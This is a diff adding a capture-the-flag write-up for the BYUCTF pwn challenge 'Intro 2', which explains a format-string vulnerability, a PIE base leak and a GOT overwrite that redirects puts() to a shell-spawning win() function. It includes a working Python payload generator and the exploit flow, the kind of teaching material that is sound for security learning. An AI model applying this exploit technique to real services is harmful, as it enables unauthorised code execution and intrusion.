@@ -1,0 +1,98 @@
+---
+title: "BYUCTF: Intro 2"
+description: "A PIE binary disguised as a rev chal. Both branches call printf(buf) with no format string. Leak the PIE base via %39$p, then a manual %hn GOT overwrite points puts@got at win(), and the very next puts() fires the shell."
+date: 2026-05-31T11:21:46.705Z
+tags: ["ctf", "pwn", "format-string", "got-overwrite", "pie", "info-leak", "byuctf"]
+draft: false
+---
+
+**Platform:** BYUCTF
+**Challenge:** Intro 2
+**Category:** Pwn
+**Difficulty:** Medium
+
+## Flag
+
+`byuctf{%p_yourself}`
+
+## Target
+
+`<remote-host>:1367`. `dist.zip` → `intro` + Dockerfile (`pwn.red/jail`, `JAIL_TIME=60`).
+
+- ELF 64-bit, **PIE**, NX on, not stripped. Imports `system` + `/bin/sh`; has `win()`.
+- Disguised as a rev chal (embedded relic flag `byuctf{welcome_to_rev_fellas}` decodes via `memfrob`/XOR-0x2a in `flag_check`). The hint says solve it by **pwning the remote**. The rev flag isn't the real one.
+
+## Recon
+
+`win()` @ `0x53c` → `system("/bin/sh")` (sets up its own `/bin/sh`, so any redirected call = shell).
+
+`main` loops up to 5 attempts:
+
+```c
+char buf[...];               // [rbp-0x70]
+char copy[...];              // [rbp-0xe0]
+scanf("%99s", buf);
+strcpy(copy, buf);
+if (flag_check(copy))   { printf("Correct! The flag is "); printf(buf); ... }
+else                    { printf("Incorrect flag: ");      printf(buf);   // <-- VULN
+                          puts("Try again."); }             // <-- trigger
+```
+
+Both branches call **`printf(buf)`** with no format string → **format-string vulnerability**, reachable just by sending a wrong flag. `%99s` and `strcpy` both stay in-frame (no stack overflow), so the format string is *the* bug.
+
+## Finding the offset & leaks
+
+Send `BBBBBBBB.%p.%p...`: the marker `0x4242424242424242` lands on the **20th** `%p` → format buffer is at **arg offset 20**. (Offsets 7 to 15 are the `strcpy` copy, mangled because `flag_check` runs `memfrob` on it in place.)
+
+Scanning deeper:
+
+- **`%39$p`** → pointer to `main` = `base + 0x5c9` ⇒ **PIE base leak**.
+- `%35$p` → a libc pointer (unused here).
+
+## Leak PIE, then GOT overwrite → win
+
+Partial RELRO ⇒ GOT writable. `puts@got = base + 0x3018`. The plan fits the control flow perfectly: in the *Incorrect* branch, **`puts("Try again.")` is called immediately after the vulnerable `printf`**. So:
+
+1. **Attempt 1:** send `%39$p`, leak `main`, compute `base`.
+2. **Attempt 2:** format-string write `win` (`base+0x53c`) into `puts@got`. When the trailing `puts()` fires, it jumps to `win` → `system("/bin/sh")`.
+
+**Payload construction (manual, fits in 99 bytes):**
+
+- Write the low **6 bytes** of `win` as three `%hn` shorts to `puts_got`, `+2`, `+4` (the top 2 bytes are `0x0000`, same as the original entry, so skip them).
+- 64-bit target addresses contain null bytes, so place all addresses **after** every format directive. `scanf("%99s")` happily reads embedded nulls (only whitespace stops it); `printf` executes all `%hn` writes *before* hitting the first null in the address block and stopping. Order the shorts ascending so the cumulative `%c` widths chain.
+- Reject payloads where the (ASLR-dependent) address bytes contain whitespace (`0x20/09/0a`) and reconnect. Rare.
+
+```python
+def make_payload(addr, value, start_off=20, cap=99):
+    shorts  = [value & 0xffff, (value>>16)&0xffff, (value>>32)&0xffff]
+    targets = [addr, addr+2, addr+4]
+    writes  = sorted(zip(shorts, targets))          # ascending by value
+    for addr_off in range(start_off+1, start_off+9):
+        d, printed = b'', 0
+        for i,(val,_) in enumerate(writes):
+            delta = (val - printed) % 0x10000
+            if delta: d += b'%%%dc' % delta
+            d += b'%%%d$hn' % (addr_off+i)
+            printed = val
+        region = (addr_off - start_off) * 8
+        if len(d) <= region:
+            pay = d + b'A'*(region-len(d)) + b''.join(p64(t) for _,t in writes)
+            if len(pay) <= cap and not any(b in pay for b in b' \t\n\x0b\x0c'):
+                return pay
+
+# flow: recv banner -> send b'%39$p' -> base = leak-0x5c9
+#       -> send make_payload(base+0x3018, base+0x53c) -> puts() -> win -> shell
+#       -> cat /app/flag.txt
+```
+
+Result: `base 0x559956339000 … PWNED_1000 … byuctf{%p_yourself}` (flag at `/app/flag.txt`).
+
+## Takeaways
+
+- `printf(user_buf)` is the bug even when a fixed-format `printf("%s", buf)` sits right next to it. Check every `printf` for a missing format string.
+- **PIE fmtstr workflow:** first leak a binary pointer (here `%39$p` → `main`) to recover the base, *then* write. One leak deterministically beats brute-forcing a partial overwrite (1/16 on the ASLR nibble).
+- **GOT overwrite beats return-address overwrite here** because a call to the target (`puts`) happens *in the same branch, right after* the vulnerable `printf`. Instant, deterministic trigger, no need to unwind the 5-attempt loop.
+- Null bytes in format-string addresses are fine if placed after all directives: `scanf("%s")` reads nulls; `printf` does the `%hn` writes before it stops at the null.
+- A `win()` that loads its own argument means you only need to redirect *one* call. No register control required.
+
+*0xAdham*
